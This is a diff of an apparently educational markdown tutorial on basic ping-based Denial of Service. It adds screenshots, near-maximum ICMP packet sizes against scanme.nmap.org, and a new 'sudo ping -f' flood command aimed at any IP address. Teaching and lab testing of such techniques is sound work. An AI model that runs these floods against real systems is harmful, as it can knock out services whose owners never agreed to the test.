@@ -9,20 +9,17 @@ This section demonstrates basic **Denial of Service (DoS)** techniques using lar
 ## 🔍 Step 1: Resolve IP Address of Target
 
 Use ping to resolve a website/domain to its IP:(`Nmap Scan-me website`)
+![Dos](/docs/image/Dos1.png)
 
 ```bash
 ping scanme.nmap.org
-```
-
-Example output:
-```bash
-PING example.com (45.33.32.156): 56 data bytes
 ```
 - Now use the IP (e.g., 45.33.32.156) for further tests.
 
 ## 📦 Step 2: ICMP Packet Flood with Custom Size
 Basic command to test buffer size handling:
 
+![Dos](/docs/image/Dos2.png)
 ```bash
 ping scanme.nmap.org -s 80
 ```
@@ -31,11 +28,12 @@ ping scanme.nmap.org -s 80
 Increasing this size sends more data in a single ping.
 
 **🔁 Try increasing the size gradually to find the system's limit:**
-
+![Dos](/docs/image/Dos3.png)
 ```bash
-ping scanme.nmap.org -s 1000
-ping scanme.nmap.org -s 2500
-ping scanme.nmap.org -s 5000
+ping scanme.nmap.org -s 65506
+ping scanme.nmap.org -s 65509
+ping scanme.nmap.org -s 65508
+ping scanme.nmap.org -s `65507`
 ```
 
 ## 🚫 Step 3: Prevent Packet Fragmentation with `-M do`
@@ -51,13 +49,18 @@ ping scanme.nmap.org -s 2000 -M do
 ## 🧪 Step 4: Trial-and-Error for Max Packet Size
 
 Continue increasing the size with -M do:
-![Dos](/docs/image/Dos5)
+![Dos](/docs/image/Dos5.png)
 ```bash
 ping scanme.nmap.org -s 1465 -M do
 ping 192.168.1.1 -s 1464 -M do
 ```
 ⛔ If the system becomes unresponsive or replies stop, you may have hit the packet threshold or caused disruption.
 
+![Dos](/docs/image/Dos4.png)
+**Another Technique for PING DOS**
+```bash
+sudo ping -f ip_address
+```
 ## 🛡️ Why DoS Works
 Large ICMP packets may:
 
